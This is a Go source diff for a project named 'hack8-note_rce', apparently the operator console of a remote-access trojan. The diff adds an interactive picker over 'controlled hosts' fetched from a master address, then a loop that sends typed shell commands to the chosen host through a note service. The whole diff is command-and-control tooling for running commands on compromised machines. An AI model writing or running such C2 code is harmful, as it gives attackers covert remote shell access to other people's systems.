@@ -3,7 +3,57 @@ package main
 import (
 	"fmt"
 	"hack8-note_rce/Util"
+	"github.com/AlecAivazis/survey/v2"
+	"time"
+	"bufio"
+	"strings"
+	"os"
 )
+
+
+func hostList(admin string){
+	list := Util.HostList(admin)
+	// for i := range list {
+	// 	fmt.Printf("%v:主机名:[%v]\x09note地址:[%v]\x09notekey:[%v]\n", i, list[i].HostName, list[i].Id, list[i].Notekey)
+	// }
+	var selectHost string
+	options := []string{}
+	for _, host := range list {
+        options = append(options, host.HostName)
+    }
+	prompt := &survey.Select{
+		Message: "选择一个被控端: ",
+		Options: options,
+	}
+	survey.AskOne(prompt, &selectHost)
+
+	var noteKey string
+	var noteId string
+	for i := range list {
+		if list[i].HostName == selectHost {
+			noteKey = list[i].Notekey
+			noteId = list[i].Id
+		}
+	}
+	hostExec(noteId, noteKey)
+}
+
+func hostExec(noteId, noteKey string){
+	Util.Hostexec(noteId, noteKey, "chcp 65001")
+    for {
+    	time.Sleep(1 * time.Second)
+    	fmt.Print("请输入shell命令:")
+    	reader := bufio.NewReader(os.Stdin)
+    	command, _ := reader.ReadString('\n') 
+    	command = strings.TrimSpace(command)
+    	if command == "exit" {
+    		break
+    	}
+    	if command != "" {
+    		Util.Hostexec(noteId, noteKey, command)
+    	}
+    }
+}
 
 func main() {
 	var admin string
@@ -11,36 +61,6 @@ func main() {
 
 	fmt.Println("请输入主控地址(默认为ocis)：")
 	fmt.Scan(&admin)
+	hostList(admin)
 
-	for {
-		console := 0
-		fmt.Println("\n\n1.被控端列表(被控端失联后不会自动更新)\n2.执行主机命令\n3.更新被控端列表(需等待30秒)\n")
-		fmt.Scan(&console)
-		if console == 1 {
-			list := Util.HostList(admin)
-			for i := range list {
-				fmt.Printf("%v:主机名:[%v]\x09note地址:[%v]\x09notekey:[%v]\n", i, list[i].HostName, list[i].Id, list[i].Notekey)
-			}
-		} else if console == 2 {
-			var noteid string
-			var notekey string
-			var command string
-
-			fmt.Print("请输入note地址:")
-			fmt.Scan(&noteid)
-			fmt.Print("请输入notekey:")
-			fmt.Scan(&notekey)
-			fmt.Print("请输入shell命令:")
-			fmt.Scan(&command)
-			fmt.Println("请等待30秒")
-
-			res := Util.Hostexec(noteid, notekey, command)
-			fmt.Println(res)
-		} else if console == 3 {
-			Util.RefreshHost(admin)
-			fmt.Println("刷新成功")
-		} else {
-			fmt.Println("功能暂未开发")
-		}
-	}
 }
